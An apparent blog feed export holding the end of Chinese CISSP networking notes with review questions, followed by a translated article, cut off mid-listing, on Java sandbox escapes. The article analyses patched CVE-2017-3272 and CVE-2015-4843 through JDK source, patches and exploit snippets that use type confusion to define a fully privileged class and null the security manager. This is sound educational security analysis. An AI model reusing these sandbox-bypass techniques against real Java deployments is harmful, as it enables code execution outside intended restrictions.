(3) 在数据传输的同时， 主机侦昕冲突(也就是两台或多台主机同时传送数据的情况) 。 (4) 如果检测到冲突， 那么主机就会传输一个停发信号。 (5) 如果接收到停发信号， 所有主机都会停止数据传输。每台主机都会等待一个随机的时间周期， 然后从步骤(1)开始重新执行操作。 令牌传递 这是一种使用数字令牌进行通信的L州介质访问技术。持有令牌的主机有权传输数据。一旦传输完成， 主机就会将令牌释放给下一个系统。令牌传递用在令牌环网络中， 例如FDDI。由于持有令牌的系统才有权传输数据，因此令牌环能够防止冲突。 轮询 这是一种使用主从配置进行通信的L剧介质访问技术。一个系统被标记为主系统， 其他所有系统则被A示记为从属系统。主系统依次轮询或了解每个从属系统是否需要传输数据。如果某个从属系统表达了这种需求， 那么就会被授予传输数据的特权。一旦该系统的传输结束， 主系统就继续轮询下一个从属系统。同步数据链接控制(SDLC)就使用了轮询。轮询通过使用许可系统来解决冲突。轮询是CSMA/CA 方法的逆过程。虽然二者都使用主从结构， 但是CSMA/CA 允许从系统请求特权， 而轮询则由主系统提供特权。轮询可以被配置为授予某个(或多个)系统具有比其他系统更高的优先权。例如， 如果标准的轮询模式为1、2、3、4， 那么就可以指定系统1优先， 轮询模式相应会变化为1、2 、1、3、1、4。 11.8 考试要点 了解OSI模型的各层和每一层所使用的协议 OSI模型的7层以及各层所支持的协议如下: 应用层: HTIP、FTP、LPD、SMTP， Telnet、TFTP、EDL、POP3、IMAP、SNMP、NNTP、S-RPC和SET。 表示层: 加密协议(例如， RSA和DES)与格式化类型(例如， ASCrr、EBCDICM、TIFF、JPEG、MPEG和MIDI)。 会话层: NFS、SQL和RPC。 传输层: SPX、SSL、TLS、TCP和UDP。 网络层: ICMP、RIP、OSPF、BGP、IGMP、IP、IPSec、IPX、NAT和SKIP。 数据链路层: SLIP、PPP、ARP、RARP、L2F、L2TP、PPTP、FDDI和ISDN。 物理层: EIA/TIA-232、EIA/TIA-449、X.21、HSSI、SONET、V.24和V.35。 全面了解TCP/IP 了解TCP和UDP之间的差异。熟悉4个TCP/IP层及其与OSI模型的对应关系。此外， 还要理解知名端口的使用， 并且熟悉相关的子协议。 了解不同的线缆类型及其长度和最大吞吐率 线缆连接类型包括STP、10Base-T(UTP)、10Base2(细缆)、10Base5(粗缆)、100Base-T、1000Base-T和光纤。还应当熟悉从1类到7类的UTP。 熟悉常用的LAN 技术 常用的LAN技术是以太网、令牌环和FDDI。此外还应当熟悉;模拟通信与数字通信;同步通信与异步通信;基带通信与宽带通信;广播、多播和单播通信;CSMA、CSMA/CA 和CSMA/CD;令牌传递;轮询。 了解安全的网络体系结构和设计 网络安全应考虑IP和非IP协议、网络访问控制、使用安全的服务和设备、管理多层协议以及实现端点安全。 了解网络分段的各种类型和目的 网络分段可以用来管理流量、提高性能并加强安全性。网络分段或子网的例子包括内部网、外部网和DMZ。 了解不同的无线技术 手机、蓝牙(802.15)和无线网络(802.11)都称为无线技术， 即使它们是完全不同的。了解它们的差异、优势和弱点。了解安全802.11网络的基础知识。 了解光纤通道 光纤通道是一种网络数据存储解决方案(例如SAN(存储区域网络)或NAS(网络附加存储))， 允许高速文件传输。 了解FCoE FCoE( 以太网光纤通道)用来封装光纤通道中的以太网网络通信。 了解iSCSI iSCSI(互联网小型计算机系统接口)是一个基于IP的网络存储标准。 了解802.11 和802.11a、b、g、n和ac 802.11是IEEE标准的无线网络通信。版本包括802.11(2Mbps)、802.11a(54Mbps)、802.11b(l1Mbps)、802.11g(54Mbps)、802.11n(600Mbps)和802.11ac(1.3+Mbps)。802.11标准定义了有线等效保密(WEP)。 了解现场勘测 现场勘测是调查环境中的位置和信号强度以达到部署无线接入点所需条件的过程。这个任务通常涉及利用便携式无线设备进行步行探寻以观测无线信号的强度， 并映射这一场景或建筑的示意图。 了解WPA WEP的早期选择WPA。这种技术虽有改进但本身仍是不完全可靠的。它基于LEAP和TKIP 密码体系并使用一个密码短语。 理解WPA2 WPA2是一种新的加密方案， 称为计数器模式密码块链接消息认证码协议(CCMP)，是基于AES的加密方案。 了解WEP 有线等效保密(WEP)是由IEEE 802.11定义的标准， 目的是在无线网络上提供等同于有线或有线网络同一水平的安全和加密。WEP提供对抗数据包嗅探和窃听攻击的无线传输保护。WEP的第二个好处是能够防止未经授权的无线网络访问。WEP使用预定义的共享密钥。 了解EAP EAP(可扩展认证协议)不是一个特定的认证机制;它是一个认证框架。实际上， EAP允许新的认证技术与现有的无线或点对点连接技术相兼容。 了解PEAP PEAP(受保护的可扩展认证协议)通过TLS隧道封装EAP， 提供了认证和加密的可能性。 了解LEAP LEAP(轻量级可扩展认证协议)是Cisco专有的， 用于WPA替代TKlP。协议的设计是为了在802.11i/WAP2被批准为标准之前以应对TKIP的不足。 了解MAC 过滤 MAC 过滤器是一个授权的无线客户端接口MAC地址列表， 用于无线接入点以阻止所有非授权设备的访问。 了解SSID 广播 无线网络定期在一个称为信标帧的特殊数据包内公布它们的SSID。当SSID进行广播时， 具有自动检测和连接的任何设备不仅能够看到网络， 也可以主动与网络进行连接。 了解TKIP TKIP(临时密钥完整性协议)被设计用于替代WEP且不需要更换传统的无线硬件。TKIP在802.11无线网络中得到应用并被称为WPA(Wi-Fi Protected Access)。 了解CCMP 设计CCMP(计数器模式密码块链接消息认证码协议)是为了取代WEP和TKIP闭性。CCMP使用AES(高级加密标准)和128位的密钥。 了解强制门户 强制门户是一个认证技术， 它将一个新的无线Web客户端连接重定向到一个访问控制接口页面。 了解天线的类型 各种类型的天线可用于无线客户端和基站。这些天线包括全向天线以及许多定向天线， 如Yagi天线、cantenna天线、面板天线和抛物线天线。 了解现场勘测 现场勘测使用盯信号探测器对无线信号的强度、质量和干扰进行正式评估。 了解标准的网络拓扑结构 有环型、总线型、星型和网状型几类。 了解常用的网络设备 常用的网络设备包括防火墙、路由器、集线器、桥、中继器、交换机、网关和代理。 理解不同类型的防火墙 防火墙有4种基本类型: 静态的数据包过滤、应用级网关、电路级网关以及状态检测防火墙。 了解用于连接LAN和WAN通信技术的协议服务 它们是帧中继、SMDS、X.25、ATM、HSSI、SDLC、HDLC和ISDN。 11.9 复习题 下列哪一层是OSI模型的第4层?A. 表示层B. 网络层C. 数据链路层D. 传输层 什么是封装?A. 改变数据包的源地址和目标地址B. 当数据在OSI模型中向下移动时增加报头和报尾C. 验证一个人的凭证D. 保护证据， 直到它们已经被恰当收集 0SI模型的哪一层用简单模式、半双工模式、全双工模式管理通信?A. 应用层B. 会话层C. 传输层D. 物理层 以下哪一个最不能抵抗EMI?A. 细缆B. 10Base-T UTPC. 10Base5D. 同轴电缆 以下哪一个不是网络分段的示例?A. 内部网B. DMZC. 外部网D. VPN 以下哪一个不是非IP协议?A. IPXB. UDPC. AppleTalkD. NetBEUI 如果你是bluejacking攻击的受害者， 以下哪个设备被攻陷了?A. 防火墙B. 交换机C. 蜂窝电话D. web cookies 下列哪个网络技术基于IEEE 802.3标准?A. 以太网B. 令牌环C. FDDID. HDLC 什么是TCP包装器?A. 一个在交换机上使用的封装协议B. 一个应用， 可以作为基本的防火墙功能并通过用户ID和系统ID来实现访问控制C.一个安全协议， 用于在WAN链路上保护TCP/IP通信D. 一个TCP/IP隧道机制， 用于非IP网络 什么是多层协议具备的优点， 同时也是潜在的威胁?A. 吞吐量B. 封装C. 哈希完整性检测D. 逻辑地址 通过检查源地址和目标地址、应用程序使用情况、来源以及同一会话中前数据包和当前数据包之间的关系，____防火墙能够授予广泛的访问授权并积极监视用户， 以及活动和阻止未经授权的用户和活动。A. 静态数据包过滤B. 应用级网关C. 状态检查D. 电路级网关 防火墙是第三代防火墙。A. 应用级网关B. 状态检测C. 电路级网关D. 静态数据包过滤 关于防火墙， 下列哪一项不是正确的?A. 它们都能够记录流量信息。B. 它们能阻隔病毒。C. 它们能基于可疑攻击发出问题警报D. 它们仍不能防止内部攻击 以下哪个不是可路由协议?A. OSPFB. BGPC. RPCD. RIP 是智能集线器， 因为它知道在每个出站端口上连接的系统的地址。它不是重复每个出站端口上的流量， 而只重复目的地己知的出站流量。A. 中继器B. 交换机C. 桥D. 路由器 下列哪一项不是802. 11无线网络相关的技术?A. WAPB. WPAC. WEPD. 802. 11i 哪种无线频率访问方法提供不受干扰的最大吞吐量?A. FHSSB. DSSSC. OFDMD. OSPF 什么安全概念鼓励管理员在每台主机上安装防火墙、防病毒扫描器和IDS?A. 端点安全B. 网络访问控制(NAC)C. VLAND. RADIUS RARP执行什么功能?A. 它是一种路由协议。B. 它将IP地址转换为MAC地址。C. 它将物理地址解析成逻辑地址。D. 它管理多重流。 在大型的物理环境中， 无线网络部署何种形式的基础设施模式支持众多接入点只使用单一的SSID?A. 独立B. 有线扩展c. 企业扩展D. 桥]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Java沙箱逃逸的这20年]]></title>
    <url>%2FSecurity%2F%E5%85%B3%E4%BA%8EJava%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E8%BF%9920%E5%B9%B4%2F</url>
    <content type="text"><![CDATA[1. 简介 Java平台广泛部署在各种服务器、桌面工作站和消费电子产品上。它旨在实现精心设计的安全模型，即Java沙箱能够在主机不受到威胁的前提下执行各种具有潜在威胁的代码。具体地说，这种沙盒方法用于安全执行不受信任的Java应用程序，例如Web浏览器中的Java applet。不幸的是，尽管这二十年来安全人员已经付出了巨大的努力不断修复漏洞和改进平台安全性，但是各种沙箱绕过漏洞仍然层出不穷。 在这项工作中，我们回顾了Java不安全的过去和现在。我们出于教育目的列举所有已知并在当前版本中已修复的安全漏洞，目标是为了概述Java平台安全性问题，这样我们就可以从过去的错误中吸取教训。 2. 背景2.1 Java沙箱漏洞简史 Sun的第一个版本是由Sun Microsystems于1995年发布的。一年后，普林斯顿大学的研究人员发现了多个缺陷能够绕过沙箱。作者发现了语言，字节码和对象初始化方面的弱点，仅举几例，其中一些在撰写本文时仍然存在于Java中。这是第一次详细描述针对Java运行时的类欺骗攻击。几年后，在2002年，The Last Stage of Delirium（LSD）研究小组提出了他们关于Java虚拟机安全性的发现。他们详细介绍了影响字节码验证程序和类加载程序的漏洞，导致类型混淆或类欺骗攻击。2010年，Koivu首次通过解释如何利用他发现的CVE-2010-0840漏洞公开表明可信方法链攻击对Java起作用。2011年，Drake描述了如何利用Java中的内存破坏漏洞。他解释了如何利用CVE-2009-3869和CVE-2010-3552两个堆栈缓冲区溢出漏洞。2012年，Guillardoy描述了CVE-2012-4681，这两个漏洞允许绕过沙箱。第一个漏洞允许访问受限制的类，第二个漏洞允许修改私有字段。同样在2012年，Oh描述了如何利用CVE-2012-0507的漏洞执行类型混淆攻击来绕过Java沙箱。2013年，Gorenc和Spelman对120个Java漏洞进行了大规模研究，并得出结论，不安全反射是Java中最常见的漏洞，但这种混淆是最常见的漏洞利用。仍然在2013年，Lee和Nie发现了多个漏洞，包括本机方法中的漏洞，可以绕过沙箱。同样在2013年，Kaiser描述了CVE-2013-1438，一个由James Forshaw发现的可靠方法链漏洞，CVE-2012-5088是Security Explorations发现的Java反射漏洞。在2012年至2013年期间，Security Explorations的安全研究人员发现了20多个Java漏洞。从2014年开始，主要网络浏览器（如Chrome或Firefox）的开发人员决定默认禁用NAPI（因此默认情况下不能执行任何Java代码）。Java的攻击面正在减少，似乎对Java沙箱旁路的研究较少。但是，绕过沙盒的漏洞仍然会偶尔弹出。例如，在2018年，Lee描述了如何利用CVE-2018-2826，这是XOR19发现的类型混淆漏洞。 2.2 Java平台 Java平台可以分为两个抽象组件：Java虚拟机（JVM）和Java类库（JCL）。 JVM是该平台的核心。它以本机代码实现，并提供程序执行所需的所有基本功能，例如字节码解析器，JIT编译器，垃圾收集器等。由于它是本机实现的，因此它也受到与任何其他本机二进制相同的攻击，例如包括缓冲区溢出等内存损坏漏洞。 JCL是与JVM一起提供的标准库。它包含数百个系统类，主要用Java实现，其中较小的部分是本机实现的。由于所有系统类都是受信任的，因此默认情况下它们与所有权限相关联。这些权限使他们可以完全访问任何类型的功能（文件系统读/写，完全访问网络等），从而完全访问主机。因此，分析人员可能会使用系统类中的任何安全错误来打破沙箱。 因此，本文的主要内容分为两个较大的部分:一个处理内存损坏漏洞，另一个侧重于Java级别的漏洞。 2.3 安全管理 在JCL的代码中，沙箱是通过授权检查实现的，其中大多数是权限检查。例如，在对文件系统进行任何访问之前，JCL中的代码会检查调用者是否具有访问文件系统的权限。下面是检类java.io.FileInputStream中文件的读取权限的示例。构造函数检查调用者是否具有读取第5行上的指定文件的读取权限。 1234567891011121314151617 1: public FileInputStream(File file) throws FileNotFoundException &#123; 2: String name = (file != null ? file.getPath() : null); 3: SecurityManager security = System.getSecurityManager(); 4: if (security != null) &#123; 5: security.checkRead(name); 6: &#125; 7: if (name == null) &#123; 8: throw new NullPointerException(); 9: &#125;10: if (file.isInvalid()) &#123;11: throw new FileNotFoundException("Invalid file path");12: &#125;13: fd = new FileDescriptor();14: fd.incrementAndGetUseCount();15: this.path = name;16: open(name);17: &#125; 请注意，出于性能原因，仅在设置了安全管理器时才会检查授权（第3-4行）。因此，逃避Java沙箱的典型攻击旨在将安全管理器设置为null。这有效地禁用了所有授权检查。如果没有设置安全管理器，分析师可以执行任何代码，就像它拥有所有授权一样。 但是，只能在Java级别检查授权。本机代码与所有授权一起执行。虽然在利用内存损坏漏洞时可能直接执行任意分析师的受控本机代码，但在本文的所有示例中，我们都专注于禁用安全管理器以便能够执行具有所有权限的任意Java代码。 2.4 doPrivileged方法 当检查权限“P”时，JVM检查调用堆栈的每个元素是否具有权限“P”。如果一个元素没有“P”，则抛出安全性异常。这种方法大部分时间都可以正常工作。但是，JCL中某些不需要调用权限的方法m1（）可能需要在JCL中调用另一个方法m2（），而这又需要一个权限“P2”。使用上面的方法，如果没有权限的用户类中的方法main（）调用m1（），则由于m1（）中对m2（）的后续调用，JVM会抛出安全性异常。实际上，在调用堆栈遍历期间，m1（）和m2（）具有所需的权限，因为它们属于JCL中的受信任类，但main（）没有权限。 解决方案是在doPrivileged（）调用中将m1（）中的调用包装到m2（）中。因此，当检查“P2”时，堆栈遍历停止在调用doPrivileged（）的方法，这里是m1（）。由于m1（）是JCL中的一个方法，因此它具有所有权限。因此，检查成功并且堆栈步行停止。 一个真实的例子是java.nio.Bits中的方法unaligned（）。它处理网络流并且必须知道处理器的体系结构。但是，获取此信息需要用户代码可能没有的“get_property”权限。因此，在这种情况下，由于权限检查，从不受信任的类调用unaligned（）会失败。因此，检索有关处理器体系结构的信息的unaligned（）中的代码包含在doPrivileged调用中，如下所示（第4-5行）： 12345678910 1: static boolean unaligned() &#123; 2: if (unalignedKnown) 3: return unaligned; 4: String arch = AccessController.doPrivileged( 5: new sun.security.action.GetPropertyAction("os.arch")); 6: unaligned = arch.equals("i386") || arch.equals("x86") 7: || arch.equals("amd64") || arch.equals("x86_64"); 8: unalignedKnown = true; 9: return unaligned;10: &#125; 选中“get_property”权限后，堆栈遍历将方法检查为Bits.unaligned（），然后停止。 3. 内存腐败漏洞3.1 类型混乱3.1.1 背景 我们描述的第一个内存损坏漏洞是一种类型混淆漏洞。许多Java漏洞依赖于类型混淆漏洞来逃避沙箱以及最近。简而言之，当存在类型混淆时，VM认为对象的类型为_A_，而实际上对象的类型为_B_。如何使用它来禁用安全管理器？ 答案是，类型混淆漏洞可用于访问未经许可无法为分析师提供的方法。分析师所针对的典型方法是ClassLoader类的defineClass（）方法。为什么？好吧，这种方法允许使用所有权限定义自定义类（因此可能是分析师控制的）。因此，分析人员将创建并执行他自己新定义的类，该类包含禁用安全管理器绕过所有授权检查的代码。 方法defineClass（）是’protected’，因此只能从类ClassLoader中的方法或ClassLoader的子类调用。由于分析师无法修改ClassLoader中的方法，因此他唯一的选择是将ClassLoader子类化为能够调用defineClass（）。但是，直接从没有权限的代码实例化ClassLoader的子类会触发安全异常，因为ClassLoader的构造函数会检查权限“Create_ClassLoader”。诀窍是分析师定义一个扩展ClassLoader的类，例如下面的Help类，并添加一个静态方法，其类型为Help的对象作为参数。然后，分析师从环境中检索现有的ClassLoader实例，并使用类型混淆将其“强制转换”为Help。使用这种方法，JVM认为方法doWork（）（下面的第4行）的h是ClassLoader的子类（而它的实际类型是ClassLoader），因此受保护的方法defineClass（）变得可供分析师使用（受保护的方法） Java可以从子类访问）。 12345678910111213141516171819 1: public class Help extends ClassLoader implements 2: Serializable &#123; 3: 4: public static void doWork(Help h) throws Throwable &#123; 5: 6: byte[] buffer = BypassExploit.getDefaultHelper(); 7: URL url = new URL("file:///"); 8: Certificate[] certs = new Certificate[0]; 9: Permissions perm = new Permissions();10: perm.add(new AllPermission());11: ProtectionDomain protectionDomain = new ProtectionDomain(12: new CodeSource(url, certs), perm);13:14: Class cls = h.defineClass("DefaultHelper", buffer, 0,15: buffer.length, protectionDomain);16: cls.newInstance();17:18: &#125;19: &#125; 更准确地说，使用类型混淆漏洞，分析师可以分三步禁用沙箱。首先，分析师可以按如下方式检索应用程序类加载器（此步骤不需要权限）：Object cl = Help.class.getClassLoader(); 其次，使用类型混淆漏洞，他可以让VM认为对象cl的类型为Help。Help h = use_type_confusion_to_convert_to_Help(cl); 第三，他提供了h作为Help中静态方法doWork（）的参数，它禁用了安全管理器。 doWork（）方法首先加载但尚未执行缓冲区中分析师控制的DefaultHelper类的字节码（上面清单中的第6行）。如下所示，此类在其构造函数中禁用doPrivileged（）块中的安全管理器。doPrivileged（）块是必要的，以防止检查整个调用堆栈的权限，因为main（）是调用序列的一部分，它没有权限。 1234567891: public class DefaultHelper implements PrivilegedExceptionAction&lt;Void&gt; &#123;2: public DefaultHelper() &#123;3: AccessController.doPrivileged(this);4: &#125;5:6: public Void run() throws Exception &#123;7: System.setSecurityManager(null);8: &#125;9: &#125; 加载字节码后，它会创建一个具有所有权限的保护域（第7-12行）。最后，它调用h上的defineClass（）（第14-15行）。此调用有效，因为VM认为h的类型为Help。实际上，h的类型为ClassLoader。但是，由于方法defineClass（）在类ClassLoader中定义为受保护方法，因此调用是成功的。此时，分析师已经加载了自己的所有权限。最后一步（第16行）是实例化该类以触发对run（）方法的调用，该方法禁用安全管理器。禁用安全管理器后，分析人员可以执行任何Java代码，就好像它具有所有权限一样。 3.1.2 示例：CVE-2017-3272 上一节解释了类型混淆漏洞是什么以及分析师如何利用它来禁用安全管理器。本节提供了一个示例，说明了如何使用CVE-2017-3272来实现此类攻击。 Redhat的bugzilla提供了有关CVE-2017-3272的以下技术细节： “据发现，OpenJDK的Libraries组件中的java.util.concurrent.atomic包中的原子字段更新程序没有正确地限制对受保护字段成员的访问。不受信任的Java应用程序或applet可能会利用此漏洞绕过Java沙箱限制“。 这表明易受攻击的代码位于java.util.concurrent.atomic.package中，这与访问受保护的字段有关。该页面还链接到OpenJDK的补丁“8165344：更新并发支持”。此修补程序修改_AtomicIntegerFieldUpdater _，_ AtomicLongFieldUpdater和AtomicReferenceFieldUpdater类。这些课程用于什么？ 为了处理字段的并发修改，Java提供AtomicLong，AtomicInt和AtomicBoolean等…例如，为了创建可以执行并发修改的一千万个long字段，必须实例化一千万个AtomicLong对象。由于AtomicLong的单个实例需要24个字节+4个字节来引用实例= 28个字节，因此1000万个AtomicLong实例代表267个Mib。 相比之下，使用AtomicLongFieldUpdater类，它只需要10.000.000 8 = 76 MiB。实际上，只有长场占据空间。此外，由于_Atomic FieldUpdater_类中的所有方法都是静态的，因此只创建更新程序的单个实例。使用Atomic * FieldUpdater类的另一个好处是垃圾收集器不必跟踪一千万个AtomicLong对象。但是，为了能够这样做，updater使用Java的不安全功能来通过sun.misc.Unsafe类检索目标字段的内存地址。 如何创建AtomicReferenceFieldUpdater的实例如下所示。方法newUpdater（）必须使用三个参数调用：tclass，包含字段的类的类型，vclass字段的类型和fieldName，字段的名称。 12345671: public static &lt;U,W&gt; AtomicReferenceFieldUpdater&lt;U,W&gt; newUpdater(2: Class&lt;U&gt; tclass,3: Class&lt;W&gt; vclass,4: String fieldName) &#123;5: return new AtomicReferenceFieldUpdaterImpl&lt;U,W&gt;6: (tclass, vclass, fieldName, Reflection.getCallerClass());7: &#125; 方法newUpdater（）调用AtomicReferenceFieldUpdaterImpl的构造函数来完成实际的工作。 123456789101112131415161718192021222324252627282930313233343536373839404142434445 1: AtomicReferenceFieldUpdaterImpl(final Class&lt;T&gt; tclass, 2: final Class&lt;V&gt; vclass, 3: final String fieldName, 4: final Class&lt;?&gt; caller) &#123; 5: final Field field; 6: final Class&lt;?&gt; fieldClass; 7: final int modifiers; 8: try &#123; 9: field = AccessController.doPrivileged(10: new PrivilegedExceptionAction&lt;Field&gt;() &#123;11: public Field run() throws NoSuchFieldException &#123;12: return tclass.getDeclaredField(fieldName);13: &#125;14: &#125;);15: modifiers = field.getModifiers();16: sun.reflect.misc.ReflectUtil.ensureMemberAccess(17: caller, tclass, null, modifiers);18: ClassLoader cl = tclass.getClassLoader();19: ClassLoader ccl = caller.getClassLoader();20: if ((ccl != null) &amp;&amp; (ccl != cl) &amp;&amp;21: ((cl == null) || !isAncestor(cl, ccl))) &#123;22: sun.reflect.misc.ReflectUtil.checkPackageAccess(tclass);23: &#125;24: fieldClass = field.getType();25: &#125; catch (PrivilegedActionException pae) &#123;26: throw new RuntimeException(pae.getException());27: &#125; catch (Exception ex) &#123;28: throw new RuntimeException(ex);29: &#125;30:31: if (vclass != fieldClass)32: throw new ClassCastException();33:34: if (!Modifier.isVolatile(modifiers))35: throw new IllegalArgumentException("Must be volatile type");36:37: this.cclass = (Modifier.isProtected(modifiers) &amp;&amp;38: caller != tclass) ? caller : null;39: this.tclass = tclass;40: if (vclass == Object.class)41: this.vclass = null;42: else43: this.vclass = vclass;44: offset = unsafe.objectFieldOffset(field);45: &#125; 构造函数首先通过反射检索要更新的字段（第12行）。请注意，即使代码没有任何权限，反射调用也会起作用。这是因为调用是在doPrivileged（）块内执行的，该块告诉JVM即使原始调用者具有该权限也允许某些操作（参见第2.4节）。接下来，如果字段具有protected属性并且调用者类与tclass类不同，则调用者存储在cclass中（第37-38行）。请注意，调用者是通过调用Reflection.getCallerClass（）在方法newUpdater（）中设置的。这些行（37-38）很奇怪，因为类调用者可能与类tclass无关。我们将在下面看到这些线是漏洞所在的位置。接下来，构造函数存储tclass，vclass并使用类Unsafe的引用unsafe来获取字段的偏移量（第39-44行）。这是一个红旗，因为Unsafe类非常危险。它可以用于直接操作Java程序中不可能的内存。如果它直接或间接地掌握在分析师手中，它可以用来绕过Java沙箱。 一旦分析师引用了AtomicReferenceFieldUpdater对象，他就可以调用它上面的set（）方法来更新字段，如下图所示： 123456789101112131415 1: public final void set(T obj, V newValue) &#123; 2: accessCheck(obj); 3: valueCheck(newValue); 4: U.putObjectVolatile(obj, offset, newValue); 5: &#125; 6: 7: private final void accessCheck(T obj) &#123; 8: if (!cclass.isInstance(obj)) 9: throwAccessCheckException(obj);10: &#125;11:12: private final void valueCheck(V v) &#123;13: if (v != null &amp;&amp; !(vclass.isInstance(v)))14: throwCCE();15: &#125; set（）的第一个参数obj是必须更新引用字段的实例。第二个参数newValue是参考字段的新值。首先，set（）检查obj是cclass类型的实例（第2行，第7-10行）。然后，set（）检查newValue为null或vclass的实例，表示字段类型（第3,12-15行）。如果所有检查都通过，则Unsafe类用于将新值放在对象obj中的右偏移处（第4行）。 该漏洞的补丁如下所示。 123456- this.cclass = (Modifier.isProtected(modifiers))- ? caller : tclass;+ this.cclass = (Modifier.isProtected(modifiers)+ &amp;&amp; tclass.isAssignableFrom(caller)+ &amp;&amp; !isSamePackage(tclass, caller))+ ? caller : tclass; 正如我们之前注意到的那样，原始代码没有对调用者对象执行足够的检查。在修补版本中，代码现在检查tclass是与调用者的超类还是超级接口相同的类。如何利用此漏洞变得显而易见，如下所示。 1234567891011121314 1: class Dummy &#123; 2: protected volatile A f; 3: &#125; 4: 5: class MyClass &#123; 6: protected volatile B g; 7: 8: main() &#123; 9: m = new MyClass();10: u = newUpdater(Dummy.class, A.class, "f");11: u.set(m, new A());12: println(m.g.getClass());13: &#125;14: &#125; 首先，类型为_A_的字段f的类Dummy用于调用newUpdater（）（第1-3,9,10行）。然后，在更新程序实例（第11行）上使用类MyClass调用方法set（），并为类型_A_的字段f调用新值newVal。而不是具有_A_类型的字段f，MyClass具有类型_B_的字段g。因此，调用set（）之后的实际g类型是_A_，但虚拟机假定类型为_B_。println（）调用将打印“A类”而不是“B类”（第12行）。但是，访问类_A_的这个实例是通过类_B_的方法和字段完成的。 3.1.3 讨论 如上所述，Atomic * FieldUpdater类已经在Java 1.5中引入。但是，该漏洞仅在版本1.8_112中检测到，并在下一版本1.8_121中进行了修补。通过在1.6_到1.8_112版本中的二分法搜索，我们发现该漏洞首次出现在1.8_92版本中。进一步的测试表明，其间的所有版本都是易受攻击的：1.8_101,1.8_102和1.8_111。我们还针对Java 1.5的第一个和最后一个版本测试了PoC：它们不容易受到攻击。 版本1.8_91（不易受攻击）和1.8_92（易受攻击）之间的AtomicReferenceFieldUpdater差异表明代码重构操作无法保留对输入值执行的所有检查的语义。版本1.8_91的非易受攻击代码如下所示。 1234567891011121314151617181920212223242526 1: private void ensureProtectedAccess(T obj) &#123; 2: if (cclass.isInstance(obj)) &#123; 3: return; 4: &#125; 5: throw new RuntimeException(... 6: &#125; 7: 8: void updateCheck(T obj, V update) &#123; 9: if (!tclass.isInstance(obj) ||10: (update != null &amp;&amp; vclass != null11: &amp;&amp; !vclass.isInstance(update)))12: throw new ClassCastException();13: if (cclass != null)14: ensureProtectedAccess(obj);15: &#125;16:17: public void set(T obj, V newValue) &#123;18: if (obj == null ||19: obj.getClass() != tclass ||20: cclass != null ||21: (newValue != null22: &amp;&amp; vclass != null23: &amp;&amp; vclass != newValue.getClass()))24: updateCheck(obj, newValue);25: unsafe.putObjectVolatile(obj, offset, newValue);26: &#125; 在非易受攻击版本中，如果obj的类型与tclass不同，包含要更新的字段的类的类型，则可能有两个条件要传递。第一个是obj可以转换为tclass（第9,12行）。第二个，只检查字段是否受保护，是obj可以转换为cclass（第14,16行）。 但是，在易受攻击的版本中，条件就是obj可以转换为cclass。obj可以转换为tclass的条件丢失了。缺少单个条件就足以创建一个安全漏洞，如果利用得当，将导致完全绕过Java沙箱。 可以预防类型混乱攻击吗？ 在Java中，出于性能原因，每次使用对象o时都不会检查对象o的类型_T_。在每次使用对象时检查类型将防止类型混淆攻击，但也会引起运行时开销。 3.2 整数溢出3.2.1 背景 当算术运算的结果太大而不适合变量的位数时，就会发生整数溢出。在Java中，整数使用32位来表示带符号的数字。正值具有从0x00000000（0）到0x7FFFFFFF（2 ^ 31-1）的值。负值的值为0x80000000（-2 ^ 31）到0xFFFFFFFF（-1）。如果值0x7FFFFFFF（2 ^ 31-1）递增，则结果不表示2 ^ 31但是（-2 ^ 31）。如何使用它来禁用安全管理器？ 在下一节中，我们将分析CVE-2015-4843的整数溢出。整数用作数组中的索引。使用溢出，我们可以读取/写入数组外的值。这些读/写原语用于实现类型混淆攻击。读者已经从上面对CVE-2017-3272的描述中了解到，分析师可以依靠这样的攻击来禁用安全管理器。 3.2.2 示例：CVE-2015-4843 Redhat的Bugzilla提供了此漏洞的简短描述。它表明在java.nio包中的Buffers类中发现了多个整数溢出，并且该漏洞可用于执行任意代码。 漏洞补丁实际上修复了文件java / nio / Direct-X-Buffer.java.template，用于生成DirectXBufferY.java形式的类，其中X可以是“Byte”，“Char”，“Double”，“Int”，“长”，“浮动”或“短”，Y可以是“S”，“U”，“RS”或“RU”。“S”表示该数组包含带符号的数字，“U”无符号数，只读模式下的“RS”有符号数和只读模式下的“RU”无符号数。每个生成的类_C_包装一个可以通过类_C_的方法操作的特定类型的数组。例如，DirectIntBufferS.java包装一个32位有符号整数的数组，并将方法get（）和set（）分别定义为将数组中的元素复制到DirectIntBufferS类的内部数组，或者将内部数组中的元素复制到类外的数组。以下是漏洞补丁的摘录： 12345678910111213141516171819202122232425262728293014: public $Type$Buffer put($type$[] src, int offset, int length) &#123;15: #if[rw]16: - if ((length &lt;&lt; $LG_BYTES_PER_VALUE$) &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;17: + if (((long)length &lt;&lt; $LG_BYTES_PER_VALUE$) &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;18: checkBounds(offset, length, src.length);19: int pos = position();20: int lim = limit();21: @@ -364,12 +364,16 @@22:23: #if[!byte]24: if (order() != ByteOrder.nativeOrder())25: - Bits.copyFrom$Memtype$Array(src, offset &lt;&lt; $LG_BYTES_PER_VALUE$,26: - ix(pos), length &lt;&lt; $LG_BYTES_PER_VALUE$);27: + Bits.copyFrom$Memtype$Array(src,28: + (long)offset &lt;&lt; $LG_BYTES_PER_VALUE$,29: + ix(pos),30: + (long)length &lt;&lt; $LG_BYTES_PER_VALUE$);31: else32: #end[!byte]33: - Bits.copyFromArray(src, arrayBaseOffset, offset &lt;&lt; $LG_BYTES_PER_VALUE$,34: - ix(pos), length &lt;&lt; $LG_BYTES_PER_VALUE$);35: + Bits.copyFromArray(src, arrayBaseOffset,36: + (long)offset &lt;&lt; $LG_BYTES_PER_VALUE$,37: + ix(pos),38: + (long)length &lt;&lt; $LG_BYTES_PER_VALUE$);39: position(pos + length); 修复（第17,28,36和38行）包括在执行移位操作之前将32位整数转换为64位整数，该移位操作在32位上可能导致整数溢出。从Java 1.8更新65中从java.nio.DirectIntBufferS.java中提取的put（）方法的更正版本如下： 1234567891011121314151617181920212223242526272829303132354: public IntBuffer put(int[] src, int offset, int length) &#123;355:356: if (((long)length &lt;&lt; 2) &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;357: checkBounds(offset, length, src.length);358: int pos = position();359: int lim = limit();360: 